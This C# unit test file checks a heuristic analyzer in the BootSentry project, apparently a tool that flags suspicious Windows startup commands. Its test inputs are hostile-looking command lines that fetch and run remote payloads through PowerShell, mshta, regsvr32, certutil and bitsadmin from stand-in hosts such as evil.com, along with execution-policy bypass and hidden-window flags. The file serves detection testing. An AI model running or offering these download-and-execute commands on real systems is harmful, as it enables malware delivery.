/*
 * Copyright 2025 Julien Bombled
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

using BootSentry.Core.Services;
using FluentAssertions;
using Xunit;

namespace BootSentry.Core.Tests.Services;

public class HeuristicAnalyzerTests
{
    private readonly HeuristicAnalyzer _analyzer;

    public HeuristicAnalyzerTests()
    {
        _analyzer = new HeuristicAnalyzer();
    }

    // ============================================================
    // Null / Empty / Whitespace Input Tests
    // ============================================================

    [Fact]
    public void Analyze_WithNullInput_ReturnsEmptyList()
    {
        var matches = _analyzer.Analyze(null);

        matches.Should().NotBeNull();
        matches.Should().BeEmpty();
    }

    [Fact]
    public void Analyze_WithEmptyString_ReturnsEmptyList()
    {
        var matches = _analyzer.Analyze(string.Empty);

        matches.Should().NotBeNull();
        matches.Should().BeEmpty();
    }

    [Fact]
    public void Analyze_WithWhitespaceOnly_ReturnsEmptyList()
    {
        var matches = _analyzer.Analyze("   \t  \n  ");

        matches.Should().NotBeNull();
        matches.Should().BeEmpty();
    }

    // ============================================================
    // Safe Command Tests
    // ============================================================

    [Fact]
    public void Analyze_WithSafeCommand_ReturnsEmptyList()
    {
        var safeCommand = @"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --no-startup-window";

        var matches = _analyzer.Analyze(safeCommand);

        matches.Should().BeEmpty();
    }

    [Fact]
    public void Analyze_WithStandardApplicationPath_ReturnsEmptyList()
    {
        var safeCommand = @"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --startup";

        var matches = _analyzer.Analyze(safeCommand);

        matches.Should().BeEmpty();
    }

    // ============================================================
    // PowerShell Encoded Command Detection
    // ============================================================

    [Theory]
    [InlineData(@"powershell.exe -EncodedCommand ZQBjAGgAbwAgACIAaABhAGMAawBlAGQAIgA=")]
    [InlineData(@"powershell.exe -e ZQBjAGgAbwAgACIAaABhAGMAawBlAGQAIgA=")]
    [InlineData(@"powershell.exe -enco ZQBjAGgAbwAgACIAaABhAGMAawBlAGQAIgA=")]
    [InlineData(@"POWERSHELL.EXE -ENCODEDCOMMAND ZQBjAGgAbwAgACIAaABhAGMAawBlAGQAIgA=")]
    public void Analyze_WithPowerShellEncodedCommand_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "PowerShell Encoded Command");
    }

    [Fact]
    public void Analyze_WithPowerShellEncodedCommand_ReturnsCorrectScore()
    {
        var commandLine = @"powershell.exe -EncodedCommand ZQBjAGgAbwAgACIAaABhAGMAawBlAGQAIgA=";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "PowerShell Encoded Command");

        match.Score.Should().Be(30);
        match.Description.Should().NotBeNullOrEmpty();
    }

    // ============================================================
    // PowerShell Web Request Detection
    // ============================================================

    [Theory]
    [InlineData(@"powershell.exe -Command Invoke-WebRequest http://evil.com/payload")]
    [InlineData(@"powershell.exe -Command iwr http://evil.com")]
    [InlineData(@"powershell.exe -Command wget http://evil.com/file")]
    [InlineData(@"powershell.exe -Command curl http://evil.com/data")]
    [InlineData(@"powershell.exe -Command (New-Object Net.WebClient).DownloadString('http://evil.com')")]
    [InlineData(@"powershell.exe -Command (New-Object Net.WebClient).DownloadFile('http://evil.com','c:\test')")]
    public void Analyze_WithPowerShellWebRequest_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "PowerShell Web Request");
    }

    [Fact]
    public void Analyze_WithPowerShellWebRequest_ReturnsCorrectScore()
    {
        var commandLine = @"powershell.exe -Command Invoke-WebRequest http://evil.com";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "PowerShell Web Request");

        match.Score.Should().Be(40);
    }

    // ============================================================
    // PowerShell Execution Policy Bypass Detection
    // ============================================================

    [Theory]
    [InlineData(@"powershell.exe -ex bypass -File script.ps1")]
    [InlineData(@"powershell.exe -ex unrestricted -File script.ps1")]
    [InlineData(@"POWERSHELL.EXE -EX BYPASS -File script.ps1")]
    public void Analyze_WithPowerShellBypass_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "PowerShell Execution Policy Bypass");
    }

    [Fact]
    public void Analyze_WithPowerShellBypass_ReturnsCorrectScore()
    {
        var commandLine = @"powershell.exe -ex bypass -File script.ps1";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "PowerShell Execution Policy Bypass");

        match.Score.Should().Be(15);
    }

    // ============================================================
    // PowerShell Hidden Window Detection
    // ============================================================

    [Theory]
    [InlineData(@"powershell.exe -w hidden -File script.ps1")]
    [InlineData(@"powershell.exe -w h -File script.ps1")]
    [InlineData(@"POWERSHELL.EXE -W HIDDEN -File script.ps1")]
    public void Analyze_WithPowerShellHiddenWindow_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "PowerShell Window Hiding");
    }

    [Fact]
    public void Analyze_WithPowerShellHiddenWindow_ReturnsCorrectScore()
    {
        var commandLine = @"powershell.exe -w hidden -File script.ps1";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "PowerShell Window Hiding");

        match.Score.Should().Be(15);
    }

    // ============================================================
    // Suspicious Script Execution (wscript/cscript) Detection
    // ============================================================

    [Theory]
    [InlineData(@"wscript.exe C:\scripts\update.vbs")]
    [InlineData(@"cscript.exe C:\scripts\task.js")]
    [InlineData(@"wscript.exe C:\scripts\config.wsf")]
    [InlineData(@"cscript.exe C:\scripts\run.jse")]
    [InlineData(@"WSCRIPT.EXE C:\scripts\update.vbs")]
    public void Analyze_WithSuspiciousScriptExecution_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "Suspicious Script Execution");
    }

    [Fact]
    public void Analyze_WithSuspiciousScriptExecution_ReturnsCorrectScore()
    {
        var commandLine = @"wscript.exe C:\scripts\update.vbs";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "Suspicious Script Execution");

        match.Score.Should().Be(20);
    }

    // ============================================================
    // Script in Temp Folder Detection
    // ============================================================

    [Theory]
    [InlineData(@"wscript.exe %TEMP%\malware.vbs")]
    [InlineData(@"cscript.exe %TEMP%\script.js")]
    [InlineData(@"cmd.exe %TEMP%\run.bat")]
    [InlineData(@"powershell.exe \appdata\local\temp\payload.ps1")]
    public void Analyze_WithScriptInTempFolder_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "Script in Temp Folder");
    }

    [Fact]
    public void Analyze_WithScriptInTempFolder_ReturnsCorrectScore()
    {
        var commandLine = @"wscript.exe %TEMP%\malware.vbs";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "Script in Temp Folder");

        match.Score.Should().Be(40);
    }

    // ============================================================
    // Rundll32 JavaScript Execution Detection
    // ============================================================

    [Theory]
    [InlineData(@"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();")]
    [InlineData(@"RUNDLL32.EXE javascript:code")]
    public void Analyze_WithRundll32JavaScript_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "Rundll32 JavaScript Execution");
    }

    [Fact]
    public void Analyze_WithRundll32JavaScript_ReturnsCorrectScore()
    {
        var commandLine = @"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "Rundll32 JavaScript Execution");

        match.Score.Should().Be(50);
    }

    // ============================================================
    // Mshta Execution Detection
    // ============================================================

    [Theory]
    [InlineData(@"mshta.exe http://evil.com/payload.hta")]
    [InlineData(@"mshta.exe vbscript:Execute(""CreateObject(...)"")(window.close)")]
    [InlineData(@"MSHTA.EXE something")]
    public void Analyze_WithMshtaExecution_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "Mshta HTA Execution");
    }

    [Fact]
    public void Analyze_WithMshtaExecution_ReturnsCorrectScore()
    {
        var commandLine = @"mshta.exe http://evil.com/payload.hta";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "Mshta HTA Execution");

        match.Score.Should().Be(25);
    }

    // ============================================================
    // Regsvr32 Remote Script Detection
    // ============================================================

    [Theory]
    [InlineData(@"regsvr32.exe /u /n /s /i:http://evil.com/payload.sct scrobj.dll")]
    [InlineData(@"REGSVR32.EXE /u /n /s /i:http://malware.com/script.sct scrobj.dll")]
    public void Analyze_WithRegsvr32RemoteScript_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "Regsvr32 Remote Script");
    }

    [Fact]
    public void Analyze_WithRegsvr32RemoteScript_ReturnsCorrectScore()
    {
        var commandLine = @"regsvr32.exe /u /n /s /i:http://evil.com/payload.sct scrobj.dll";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "Regsvr32 Remote Script");

        match.Score.Should().Be(50);
    }

    // ============================================================
    // CertUtil Download Detection
    // ============================================================

    [Theory]
    [InlineData(@"certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe")]
    [InlineData(@"CERTUTIL.EXE -urlcache -split -f http://evil.com/file")]
    public void Analyze_WithCertUtilDownload_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "CertUtil Download");
    }

    [Fact]
    public void Analyze_WithCertUtilDownload_ReturnsCorrectScore()
    {
        var commandLine = @"certutil.exe -urlcache -split -f http://evil.com/payload.exe";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "CertUtil Download");

        match.Score.Should().Be(40);
    }

    // ============================================================
    // Bitsadmin Transfer Detection
    // ============================================================

    [Theory]
    [InlineData(@"bitsadmin /transfer myDownloadJob /download /priority high http://evil.com/file C:\temp\file")]
    [InlineData(@"BITSADMIN /TRANSFER myJob /download http://evil.com/payload C:\temp\payload")]
    public void Analyze_WithBitsadminTransfer_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "Bitsadmin Transfer");
    }

    [Fact]
    public void Analyze_WithBitsadminTransfer_ReturnsCorrectScore()
    {
        var commandLine = @"bitsadmin /transfer myDownloadJob /download /priority high http://evil.com/file";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "Bitsadmin Transfer");

        match.Score.Should().Be(30);
    }

    // ============================================================
    // Hidden Command Prompt Detection
    // ============================================================

    [Theory]
    [InlineData(@"cmd.exe /c start /min powershell.exe")]
    [InlineData(@"CMD.EXE /C START /MIN hidden.exe")]
    [InlineData(@"cmd.exe /c start min something")]
    public void Analyze_WithHiddenCommandPrompt_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "Hidden Command Prompt");
    }

    [Fact]
    public void Analyze_WithHiddenCommandPrompt_ReturnsCorrectScore()
    {
        var commandLine = @"cmd.exe /c start /min powershell.exe";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "Hidden Command Prompt");

        match.Score.Should().Be(20);
    }

    // ============================================================
    // IP Address in Command Detection
    // ============================================================

    [Theory]
    [InlineData(@"curl http://192.168.1.100/payload")]
    [InlineData(@"ping 10.0.0.1")]
    [InlineData(@"wget http://172.16.0.5/download")]
    public void Analyze_WithIpAddressInCommand_DetectsRule(string commandLine)
    {
        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().Contain(m => m.Name == "IP Address in Command");
    }

    [Fact]
    public void Analyze_WithIpAddressInCommand_ReturnsCorrectScore()
    {
        var commandLine = @"curl http://192.168.1.100/payload";

        var matches = _analyzer.Analyze(commandLine);
        var match = matches.Single(m => m.Name == "IP Address in Command");

        match.Score.Should().Be(10);
    }

    // ============================================================
    // Multiple Flags Combined Detection
    // ============================================================

    [Fact]
    public void Analyze_WithMultipleFlags_DetectsAllMatchingRules()
    {
        // Command that triggers PowerShell Encoded Command + IP Address + Hidden Window
        var commandLine = @"powershell.exe -w hidden -EncodedCommand ZQBjAGgAbwAgACIAaABhAGMAawBlAGQAIgA= http://192.168.1.1/evil";

        var matches = _analyzer.Analyze(commandLine);

        matches.Should().HaveCountGreaterThanOrEqualTo(3);
        matches.Should().Contain(m => m.Name == "PowerShell Encoded Command");
        matches.Should().Contain(m => m.Name == "PowerShell Window Hiding");
        matches.Should().Contain(m => m.Name == "IP Address in Command");
    }

    [Fact]
    public void Analyze_WithMultipleFlags_ScoresAccumulate()
    {
        var commandLine = @"powershell.exe -w hidden -ex bypass -Command Invoke-WebRequest http://192.168.1.1/payload";

        var matches = _analyzer.Analyze(commandLine);
        var totalScore = matches.Sum(m => m.Score);

        totalScore.Should().BeGreaterThan(0);
        matches.Should().HaveCountGreaterThanOrEqualTo(3);
    }

    [Fact]
    public void Analyze_WithLolBinChain_DetectsCertUtilAndIp()
    {
        var commandLine = @"certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\temp\payload.exe";

        var matches = _analyzer.Analyze(commandLine);

        matches.Should().Contain(m => m.Name == "CertUtil Download");
        matches.Should().Contain(m => m.Name == "IP Address in Command");
    }

    // ============================================================
    // Case-Insensitivity Tests
    // ============================================================

    [Fact]
    public void Analyze_IsCaseInsensitive_ForAllRules()
    {
        var commandLine = @"MSHTA.EXE HTTP://EVIL.COM/PAYLOAD.HTA";

        var matches = _analyzer.Analyze(commandLine);

        matches.Should().Contain(m => m.Name == "Mshta HTA Execution");
    }

    // ============================================================
    // Match Description Tests
    // ============================================================

    [Fact]
    public void Analyze_MatchesAlwaysIncludeDescription()
    {
        var commandLine = @"powershell.exe -w hidden -EncodedCommand ZQBjAGgAbwAgACIAaABhAGMAawBlAGQAIgA=";

        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().OnlyContain(m => !string.IsNullOrEmpty(m.Description));
    }

    [Fact]
    public void Analyze_MatchesAlwaysIncludePositiveScore()
    {
        var commandLine = @"powershell.exe -w hidden -EncodedCommand ZQBjAGgAbwAgACIAaABhAGMAawBlAGQAIgA=";

        var matches = _analyzer.Analyze(commandLine);

        matches.Should().NotBeEmpty();
        matches.Should().OnlyContain(m => m.Score > 0);
    }
}
